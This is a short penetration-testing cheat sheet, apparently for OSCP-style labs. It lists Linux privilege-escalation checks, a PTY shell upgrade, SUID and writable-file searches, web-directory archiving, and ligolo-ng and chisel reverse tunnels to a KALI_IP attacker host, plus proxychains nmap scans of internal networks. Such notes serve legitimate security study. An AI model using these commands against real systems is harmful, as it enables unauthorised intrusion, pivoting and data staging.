## Check list
- Check uid
- Check `sudo -l`
- Check hidden files including bash related files
- Check for SUID binaries
- Ports
- Installed software
- Check OS and kernel versions
- Check process
- Check software files, personal files
- Check cron jobs

- Python3 interactive shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
- Find local.txt
```
find / -type f -name local.txt 2>/dev/null
```
- Find SUID binaries
```
find / -perm -u=s -type f 2>/dev/null
```
- OS and kernel
```
uname -a
```

- Find writable files
```
find / -writable -type d 2>/dev/null
```
- zip files 
```
tar -czf /tmp/default.tar.gz -C /var/www/html/sites default
```
## Ligolo
- Server
```
sudo ligolo-proxy -selfcert
```
- Agents on release tab [links](https://github.com/nicocha30/ligolo-ng/tree/v0.9.1) 
```
.\agent -connect KALI_IP:11601 -ignore-cert
```
- After agent joined `session` --> select the session --> `interface_create --name ligolo` --> `start` --> `route_add --name ligolo --route 10.10.162.0/24`
- For loopback interface `interface_add_route --name ligolo --route 240.0.0.1/32`
## Chisel
```s
chisel.exe client KALI_IP:8080 R:socks
```
```
chisel server --reverse --port 8080
```
```
 sudo proxychains nmap -sT -Pn -p 3306,1337 127.0.0.1
```
```
sudo proxychains nmap -sT -Pn 10.10.167.142 --top-ports 1000 -T5 -oN 142.internal
```
